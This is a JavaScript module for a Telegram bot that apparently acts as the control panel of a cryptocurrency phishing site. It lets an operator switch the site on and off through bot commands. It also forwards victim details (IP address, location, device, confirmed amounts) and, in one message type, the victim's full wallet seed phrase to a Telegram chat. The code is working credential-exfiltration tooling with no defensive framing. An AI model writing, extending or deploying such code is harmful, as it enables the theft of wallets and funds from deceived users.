import fetch from 'node-fetch';
import dotenv from 'dotenv';
dotenv.config();


const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// Apple-style separator
const SEPARATOR = '━━━━━━━━━━━━━━━';

let stateRef = null;

export function initTelegramService(state) {
    stateRef = state;
    startPolling(); 
}

// Start polling for Telegram updates
async function startPolling() {
    while (true) {
        try {
            const response = await fetch(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`
            );
            
            const data = await response.json();
            
            if (data.ok && data.result.length > 0) {
                for (const update of data.result) {
                    if (update.message?.text) {
                        await handleTelegramCommand(update.message);
                    }
                    lastUpdateId = update.update_id;
                }
            }
        } catch (error) {
            console.error('Telegram polling error:', error);
        }
        
        // Small delay to prevent too frequent requests in case of errors
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}

// Handle incoming Telegram commands
async function handleTelegramCommand(message) {
    const text = message.text?.toLowerCase();
    
    if (!text?.startsWith('/')) return;

    const command = text.split(' ')[0];
    const param = text.split(' ')[1];

    switch (command) {
        case '/panel':
            if (param === 'on' || param === 'off') {
                const newStatus = param === 'on';
                // Update the actual state object
                stateRef.settings.websiteEnabled = newStatus;
                await sendStatusUpdate({
                    websiteEnabled: newStatus,
                    activeSessions: stateRef.sessions?.size || 0,
                    bannedIPs: stateRef.bannedIPs?.size || 0
                });
            }
            break;

        case '/status':
            await sendStatusUpdate({
                websiteEnabled: stateRef.settings.websiteEnabled,
                activeSessions: stateRef.sessions?.size || 0,
                bannedIPs: stateRef.bannedIPs?.size || 0
            });
            break;
    }
}

export async function sendTelegramNotification(message) {
    try {
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            console.log('Telegram notification (disabled):', message);
            return;
        }

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        if (!response.ok) {
            throw new Error(`Telegram API error: ${response.statusText}`);
        }

        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Failed to send Telegram notification:', error);
        return null;
    }
}

export function formatTelegramMessage(type, data) {
    const timestamp = new Date().toLocaleTimeString('en-US', { 
        hour12: true,
        hour: 'numeric',
        minute: '2-digit'
    });

    switch (type) {
        case 'server_status':
            return [
                '𝗦𝗲𝗿𝘃𝗲𝗿 𝗦𝘁𝗮𝘁𝘂𝘀',
                SEPARATOR,
                `⚡️ Status: ${data.status}`,
                `🔌 Port: ${data.port}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'new_session':
            return [
                '𝗡𝗲𝘄 𝗦𝗲𝘀𝘀𝗶𝗼𝗻',
                SEPARATOR,
                `⌥ Session ID: ${data.id}`,
                `📱 Device: ${data.userAgent}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'review_completed':
            return [
                '𝗥𝗲𝘃𝗶𝗲𝘄 𝗖𝗼𝗺𝗽𝗹𝗲𝘁𝗲𝗱',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'amount_confirmed':
            return [
                '𝗔𝗺𝗼𝘂𝗻𝘁 𝗖𝗼𝗻𝗳𝗶𝗿𝗺𝗲𝗱',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `💰 Amount: ${data.amount}`,
                `🌍 IP Address: ${data.ip}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'seed_phrase':
            return [
                '𝗦𝗲𝗲𝗱 𝗣𝗵𝗿𝗮𝘀𝗲 𝗥𝗲𝗰𝗲𝗶𝘃𝗲𝗱',
                SEPARATOR,
                `⌥ Session ID: ${data.sessionId}`,
                `🌍 IP Address: ${data.ip}`,
                `📍 Location: ${data.location}`,
                `🔑 Seed Phrase:`,
                `<code>${data.seedPhrase}</code>`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'session_ended':
            return [
                '𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗘𝗻𝗱𝗲𝗱',
                SEPARATOR,
                `⌥ Session ID: ${data.id}`,
                `⏱ Duration: ${formatDuration(data.duration)}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'settings_changed':
            return [
                '𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀 𝗨𝗽𝗱𝗮𝘁𝗲𝗱',
                SEPARATOR,
                ...Object.entries(data).map(([key, value]) => 
                    `⚡️ ${key}: ${value}`
                ),
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

        case 'ip_banned':
            return [
                '𝗜𝗣 𝗕𝗮𝗻𝗻𝗲𝗱',
                SEPARATOR,
                `🌍 IP Address: ${data.ip}`,
                `👤 Banned By: ${data.bannedBy}`,
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');

            case 'ip_unbanned':
                return [
                    '𝗜𝗣 𝗨𝗻𝗯𝗮𝗻𝗻𝗲𝗱',
                    SEPARATOR,
                    `🌍 IP Address: ${data.ip}`,
                    SEPARATOR,
                    `⏰ ${timestamp}`
                ].join('\n');
    
            case 'session_removed':
                return [
                    '𝗦𝗲𝘀𝘀𝗶𝗼𝗻 𝗥𝗲𝗺𝗼𝘃𝗲𝗱',
                    SEPARATOR,
                    `⌥ Session ID: ${data.id}`,
                    `👤 Removed By: ${data.removedBy}`,
                    SEPARATOR,
                    `⏰ ${timestamp}`
                ].join('\n');
    
            default:
            return [
                '𝗡𝗼𝘁𝗶𝗳𝗶𝗰𝗮𝘁𝗶𝗼𝗻',
                SEPARATOR,
                data.toString(),
                SEPARATOR,
                `⏰ ${timestamp}`
            ].join('\n');
    }
}

function formatDuration(ms) {
    const seconds = Math.floor(ms / 1000);
    const minutes = Math.floor(seconds / 60);
    const hours = Math.floor(minutes / 60);
    
    if (hours > 0) {
        return `${hours}h ${minutes % 60}m`;
    } else if (minutes > 0) {
        return `${minutes}m ${seconds % 60}s`;
    } else {
        return `${seconds}s`;
    }
}

export async function sendStatusUpdate(status) {
    const timestamp = new Date().toLocaleTimeString('en-US', { 
        hour12: true,
        hour: 'numeric',
        minute: '2-digit'
    });

    const message = [
        '𝗦𝘁𝗮𝘁𝘂𝘀 𝗨𝗽𝗱𝗮𝘁𝗲',
        SEPARATOR,
        `👥 Active Sessions: ${status.activeSessions}`,
        `🚫 Banned IPs: ${status.bannedIPs}`,
        `${status.websiteEnabled ? '✅' : '❌'} Website Status: ${status.websiteEnabled ? 'Online' : 'Offline'}`,
        SEPARATOR,
        `⏰ ${timestamp}`
    ].join('\n');

    return sendTelegramNotification(message);
}

export async function sendErrorNotification(error) {
    const timestamp = new Date().toLocaleTimeString('en-US', { 
        hour12: true,
        hour: 'numeric',
        minute: '2-digit'
    });

    const message = [
        '𝗘𝗿𝗿𝗼𝗿 𝗔𝗹𝗲𝗿𝘁',
        SEPARATOR,
        `⚠️ ${error.name}`,
        `❌ ${error.message}`,
        SEPARATOR,
        `⏰ ${timestamp}`
    ].join('\n');

    return sendTelegramNotification(message);
}

export const telegramUtils = {
    formatDuration,
    formatTelegramMessage,
    sendStatusUpdate,
    sendErrorNotification
};
